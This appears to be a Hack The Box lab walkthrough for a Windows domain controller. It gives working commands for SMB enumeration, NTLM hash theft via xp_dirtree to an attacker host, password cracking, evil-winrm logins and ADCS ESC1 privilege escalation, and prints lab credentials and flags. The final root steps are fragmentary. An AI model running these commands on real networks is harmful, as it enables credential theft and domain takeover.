# User
## Enumeration through Nmap
First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network

<img  alt="Pasted image 20231230155916" src="https://github.com/iammR0OT/HTB/assets/74102381/a40b60f5-94c0-4c89-aa8a-0ed5868f03c8">

Lets filter these ports and check for services running on these ports. to Filter out these ports i used to different utilities **tr** and **cut** in kali. **tr** to replace words and **cut** to cutout the specific content from the file. The command i used to filter out open ports is `cat nmap.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','` 

<img alt="Pasted image 20231230160146" src="https://github.com/iammR0OT/HTB/assets/74102381/80c8e442-a0fb-4664-8ed9-9e7094959e70">

Now Lets run the service check on these specific ports using `nmap  -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49714,54884 -sC -sV -A -T4 10.129.229.219 -oN nmap`. Here **-Pn**  is to Treat all hosts as online and skip host discovery, **-sC** to run all default scan scripts, **-sV** for version detection, **-A** to perform all type of default scans, **-T4** for aggressiveness and **-oN**  to store the output in file.
``` namp 
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-30 18:56:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-30T18:58:08+00:00; +7h59m34s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2022-11-18T21:05:34
|_Not valid after:  2023-11-18T21:05:34
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2022-11-18T21:05:34
|_Not valid after:  2023-11-18T21:05:34
|_ssl-date: 2023-12-30T18:58:09+00:00; +7h59m34s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-12-30T18:58:08+00:00; +7h59m34s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.229.219:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.229.219:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-12-30T18:32:43
|_Not valid after:  2053-12-30T18:32:43
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-30T18:58:08+00:00; +7h59m34s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2022-11-18T21:05:34
|_Not valid after:  2023-11-18T21:05:34
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2022-11-18T21:05:34
|_Not valid after:  2023-11-18T21:05:34
|_ssl-date: 2023-12-30T18:58:09+00:00; +7h59m34s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
54884/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m33s, deviation: 0s, median: 7h59m33s
| smb2-time: 
|   date: 2023-12-30T18:57:28
|_  start_date: N/A
```

Port 53 is **DNS** port can be used to perform DNS Zone transfer, port 389 is of ldap and can be used to perform enumeration like user's, port 139,445 is of **SMB** ports which we will enumerate very first, port 1433 **MSSQL** running which is database, Port 5985 is **winrm** port which can be used to gain a shell on a machine if somehow we managed to get valid credientials.
we also found about the NetBIOS name which is DC, and the DNS name which is sequel.htb. Lets add this `sequel.htb` into our `/etc/hosts` file so that we can access it locally. 
`Message signing is enabled and required` which means we can not perform any kind of **Relay attacks** 
## Reconnaissance 
First we will enumerate SMB shares because smb ports are open and check if we allowed to access any kind of network shares using anonymous user, because we don't have any valid user account yet. The tools we will use to enumerate the **smb shares** are **smblient** and **smbmap**, both tools are use for same purpose the only difference is that the **smbmap** give us a tree structure of shares. first let's go with **smbclient** to check if we allowed to access these shares anonymously. command we will use is `smbclient -L \\10.129.229.219` here **-L** is for List.

<img alt="Pasted image 20231230162532" src="https://github.com/iammR0OT/HTB/assets/74102381/a1fae197-d333-47ce-9ccd-e1832349c201">

Most of these shares are system default shares except the **public** share, Lets look into it and we found a .pdf file in it,

<img alt="Pasted image 20231230171813" src="https://github.com/iammR0OT/HTB/assets/74102381/fb5c1879-149d-491a-81d7-2a01e49f2acf">

Now lets download it to our attacker machine using **get** command, and open it . and we found something juicy in it, a user and a password for MSSQL. 

<img  alt="Pasted image 20231230174207" src="https://github.com/iammR0OT/HTB/assets/74102381/74f56854-092f-40a3-afc9-f47f34834a67">

	`PublicUser:GuestUserCantWrite1`
To connect with MSSQL we will use mssqlient.py from impacket toolkit with command `mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.129.229.219`, and we are inside the database.

<img alt="Pasted image 20231230182326" src="https://github.com/iammR0OT/HTB/assets/74102381/2e23b7ee-dc17-453b-ab74-7d6f209652bf">

I tried to crawl the databases but didn't found anything useful. :/
After reading through the [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) article on **MSSQL** testing, i **found Steal NetNTLM hash / Relay attack** heading that we can steal NTLM hash of that account from DC and can use pass the hash or perform bruteforce attack to get plain text password, Let's do it.
First we need to start SMB server to capture the hash used in authentication part. To start SMB server we can use both **responder** or **impacket-smbserver**, We will go the **impacket-smbserver**  

<img alt="Pasted image 20231230184459" src="https://github.com/iammR0OT/HTB/assets/74102381/692fa836-44b0-4965-8397-5b7b45616f27">

Now run `xp_dirtree '\\<attacker_IP>\any\thing'` on **MSSQL**, 

<img  alt="Pasted image 20231230184605" src="https://github.com/iammR0OT/HTB/assets/74102381/7dc17a53-6078-408d-b4e8-9b290c4cf336">

Now go back to you smb server and boom we got hash for SQL service account. 

<img alt="Pasted image 20231230184726" src="https://github.com/iammR0OT/HTB/assets/74102381/809d0b14-6bc3-40e9-bede-4169fff44a1f">

```
sql_svc::sequel:aaaaaaaaaaaaaaaa:1bcb673bf8cb362a65542e8335a08fea:0101000000000000003c5513263bda019a730f0037544184000000000100100061005500770078006f006e006d0057000300100061005500770078006f006e006d0057000200100077004400530059004b004a00690051000400100077004400530059004b004a006900510007000800003c5513263bda01060004000200000008003000300000000000000000000000003000006e4fd04313c4f410a5aa3ba1747dcac85ad066f128cec6d99026ee20511e76480a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e003100350038000000000000000000
```
Let's crack it using hashcat using command `hashcat hash.txt password-wordlist`, and we got a password for SQL_SVC account. 
	`sql_svc: REGGIE1234ronnie`

<img  alt="Pasted image 20231230185240" src="https://github.com/iammR0OT/HTB/assets/74102381/9531ee74-7e34-493f-a490-8a427a1cb954">

Form SMB shares we have come to know that the anonymous login is allowed because we were able to see the shares without any valid credientials, we can use tool from impacket toolkit called **lookupsid** to enumerate users and their SID on domain. for this we will use command `impacket-lookupsid <domain>/anonymous@<ip> -no-pass` here -no-pass is for not asking the password, and we get a list of users and their SID on domain `sequel.htb`

<img alt="Pasted image 20231231120843" src="https://github.com/iammR0OT/HTB/assets/74102381/3e091b87-9f4b-4fd0-be4d-b63237f847b4">

<img alt="Pasted image 20231231121332" src="https://github.com/iammR0OT/HTB/assets/74102381/c2143c29-b040-488f-817a-e2df1894dcb0">

```users
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
James.Roberts
Nicole.Thompson
SQLServer2005SQLBrowserUser$DC
```
Lets login into account using **Evil-winrm** using command `evil-winrm -i 10.129.229.219 -u sql_svc -p REGGIE1234ronnie`

<img  alt="Pasted image 20231230191822" src="https://github.com/iammR0OT/HTB/assets/74102381/7f46a026-4fd1-4c41-b4c1-ab10ee475ad8">

In `C:\SQLServer\logs` folder i found a backup file named **ERRORLOG.BAK**, Lets download it to our local machine using `download ERRORLOG.BAK` and view content inside it. Inside the backup file i found some interesting logs where i there is a username and a password.
	Ryan.Cooper: NuclearMosquito3

<img alt="Pasted image 20231231122843" src="https://github.com/iammR0OT/HTB/assets/74102381/cc0d9db7-722e-41c8-bc49-dd8886837780">

Let's try to login through it using `evil-winrm -i 10.129.228.253 -u 'Ryan.Cooper' -p NuclearMosquito3`. And we are inside the Ryan user account and you can get your user flag from Desktop Directory. 

<img alt="Pasted image 20231231123207" src="https://github.com/iammR0OT/HTB/assets/74102381/f7d461c7-ba0c-4624-8a92-f6ae1ed1d31c">

# Root
Certificate Exploitation Explained [here](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
Moving towards Root let's upload Certify.exe to victim machine and try to find out if we have any vulnerable certificate using `./Certify.exe find /vulnerable` and we found one vulnerable certificate name **User Authentication**  

<img alt="Pasted image 20231231125215" src="https://github.com/iammR0OT/HTB/assets/74102381/60c21a56-f119-4c62-af41-07cb4090ed74">

After moving towards hacktricks article i found that it is vulnerable to ESC1 **Misconfigured Certificate Templates ESC1** you can find it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1) Lets move toward the exploitation part. 
Run `Certify.exe request /ca:dc.sequel.htb-DC-CA /template:<VulnTemplate> /altname:<administrator>` to abuse this vulnerability to impersonate an **administrator** but certipy give use some weird error, so ew have to perform it remotely through **certipy** tool using command `python3.10 /usr/local/bin/certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequel.htb -debug`

![Pasted image 20231231163655](https://github.com/iammR0OT/HTB/assets/74102381/85eda92b-a0eb-4b34-92cb-bb8eccab10ea)

Now we need to convert this .pfx file into 
`certipy auth -pfx 'administrator_dc.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip 10.129.230.21 `

add_user_to_group  sql_svc  administrator

# Flags
User : 3a2c59b412b444d1f7b71b065e91b64b

Root : 72e16ce34925798bd38e49373c2cc7cc
# Happy Hacking ❤
